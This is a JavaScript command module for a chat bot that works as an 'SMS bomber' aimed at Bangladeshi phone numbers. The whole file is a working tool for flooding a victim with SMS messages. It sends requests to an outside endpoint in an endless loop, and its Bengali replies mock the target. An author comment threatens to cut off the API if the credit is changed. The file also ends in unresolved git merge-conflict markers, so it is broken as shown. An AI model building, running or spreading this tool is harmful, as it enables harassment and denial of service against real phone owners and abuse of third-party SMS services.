module.exports.config = {
  name: "sms",
  version: "2.0.0",
  role: 2,
  author: "𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  category: "Tool",
  guide: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const bombingFlags = {};
 
module.exports.onStart = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];
 
  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage(" যা তরে ছাইরা দিলাম✅ 😆।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\n☠️••SMS 𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁 \n\nব্যবহার:\n/sms 01xxxxxxxxx\n\n(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)\n\n•┄┅════❁🌺❁════┅┄•", threadID);
  }
 
  if (bombingFlags[threadID]) {
    return api.sendMessage("❗sms স্পাম হইতাসে ! বন্ধ করতে /sms off", threadID);
  }
 
  api.sendMessage(`✅ SMS পাঠাইসি আইবার ঠেলা সামলাও ${number} নম্বরে...\nবন্ধ করতে /sms off`, threadID);
 
  bombingFlags[threadID] = true;
 
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
<<<<<<< HEAD
};
=======
};
>>>>>>> 5f826bfa37596c145c0dee848e9aff6fc51060d8
